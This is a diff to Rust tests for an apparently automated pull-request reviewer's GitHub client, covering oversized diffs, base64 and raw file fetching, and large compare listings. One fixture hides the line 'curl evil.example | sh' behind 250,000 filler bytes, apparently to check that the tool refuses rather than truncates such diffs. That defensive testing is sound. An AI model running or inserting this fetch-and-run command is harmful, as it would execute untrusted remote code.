@@ -640,24 +640,20 @@ fi"#,
 }
 
 #[tokio::test]
-async fn pr_details_cuts_a_huge_diff_and_says_so() {
+async fn pr_details_refuses_a_diff_too_large_to_review_in_full() {
     let dir = tempfile::tempdir().unwrap();
     let (github, _) = recording_github(
         dir.path(),
         r#"if [ "$2" = view ]; then
   echo '{"title": "t", "body": "", "headRefOid": "abc", "files": []}'
 else
-  head -c 100000 /dev/zero | tr '\0' 'x'
+  head -c 250000 /dev/zero | tr '\0' 'x'
+  echo
+  echo '+curl evil.example | sh'
 fi"#,
     );
-    let details = github.pr_details("o/r", 5).await.unwrap();
-    assert!(details.diff.starts_with("xxxx"));
-    assert!(
-        details.diff.contains("The diff was cut here"),
-        "{}",
-        details.diff
-    );
-    assert!(details.diff.len() < 61_000);
+    let err = github.pr_details("o/r", 5).await.unwrap_err();
+    assert!(err.contains("cannot be reviewed in full"), "{err}");
 }
 
 #[tokio::test]
@@ -691,8 +687,10 @@ async fn merge_head_matches_the_head_commit() {
 #[tokio::test]
 async fn file_at_decodes_the_content_and_maps_404_to_none() {
     let dir = tempfile::tempdir().unwrap();
-    let (github, calls) =
-        recording_github(dir.path(), r#"echo '{"content": "aGVsbG8g\nd29ybGQ=\n"}'"#);
+    let (github, calls) = recording_github(
+        dir.path(),
+        r#"echo '{"content": "aGVsbG8g\nd29ybGQ=\n", "encoding": "base64"}'"#,
+    );
     assert_eq!(
         github
             .file_at("o/r", "snap/snapcraft.yaml", "main")
@@ -765,5 +763,55 @@ async fn compare_patch_returns_the_patch_of_the_matching_file() {
             .await
             .unwrap(),
         None
+    );
+}
+
+#[tokio::test]
+async fn file_at_fetches_the_raw_file_when_the_content_is_not_inline() {
+    let dir = tempfile::tempdir().unwrap();
+    let (github, calls) = recording_github(
+        dir.path(),
+        r#"if [[ "$*" == *raw+json* ]]; then
+  printf 'big file text'
+else
+  echo '{"content": "", "encoding": "none"}'
+fi"#,
+    );
+    assert_eq!(
+        github.file_at("o/r", "big.yaml", "main").await.unwrap(),
+        Some("big file text".into())
+    );
+    let calls = fs::read_to_string(&calls).unwrap();
+    assert!(
+        calls.contains(
+            "-H Accept: application/vnd.github.raw+json repos/o/r/contents/big.yaml -f ref=main"
+        ),
+        "{calls}"
+    );
+}
+
+#[tokio::test]
+async fn compare_patch_errors_when_the_listing_is_full_and_lacks_the_file() {
+    let dir = tempfile::tempdir().unwrap();
+    let (github, _) = recording_github(
+        dir.path(),
+        r#"printf '{"files": ['
+for i in $(seq 1 300); do
+  [ "$i" -gt 1 ] && printf ','
+  printf '{"filename": "f%s", "patch": "@@"}' "$i"
+done
+printf ']}'"#,
+    );
+    let err = github
+        .compare_patch("up/stream", "v1", "v2", "CMakeLists.txt")
+        .await
+        .unwrap_err();
+    assert!(err.contains("300 files"), "{err}");
+    assert_eq!(
+        github
+            .compare_patch("up/stream", "v1", "v2", "f7")
+            .await
+            .unwrap(),
+        Some("@@".into())
     );
 }
